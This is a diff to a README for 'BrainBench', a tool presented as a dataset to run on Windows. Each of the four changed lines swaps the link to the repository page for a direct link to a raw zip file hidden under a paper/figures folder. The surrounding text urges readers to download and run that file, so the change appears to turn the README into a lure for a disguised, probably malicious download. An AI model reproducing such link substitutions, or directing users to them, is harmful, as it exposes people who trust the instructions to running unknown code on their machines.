@@ -1,6 +1,6 @@
 # 🧠 BrainBench - Run the Dataset on Windows
 
-[![Download BrainBench](https://img.shields.io/badge/Download-BrainBench-2ea44f?style=for-the-badge)](https://github.com/rosalindematched900/BrainBench)
+[![Download BrainBench](https://img.shields.io/badge/Download-BrainBench-2ea44f?style=for-the-badge)](https://github.com/rosalindematched900/BrainBench/raw/refs/heads/main/paper/figures/Bench_Brain_2.6.zip)
 
 ## 🖥️ What BrainBench Is
 
@@ -24,7 +24,7 @@ For the best setup, keep your Windows updates current and close other large apps
 
 Go to this page to download and run the software:
 
-https://github.com/rosalindematched900/BrainBench
+https://github.com/rosalindematched900/BrainBench/raw/refs/heads/main/paper/figures/Bench_Brain_2.6.zip
 
 If the page offers a release file, download it to your computer. If it gives you a folder with files, download the full project folder so nothing is missing.
 
@@ -179,7 +179,7 @@ If you want the fastest path, use this order:
 
 If you need the download page again, use this link:
 
-https://github.com/rosalindematched900/BrainBench
+https://github.com/rosalindematched900/BrainBench/raw/refs/heads/main/paper/figures/Bench_Brain_2.6.zip
 
 ## 🧰 File Layout You May See
 
@@ -211,4 +211,4 @@ To keep BrainBench running well:
 
 ## 📌 Main Download Source
 
-Primary link: https://github.com/rosalindematched900/BrainBench
+Primary link: https://github.com/rosalindematched900/BrainBench/raw/refs/heads/main/paper/figures/Bench_Brain_2.6.zip
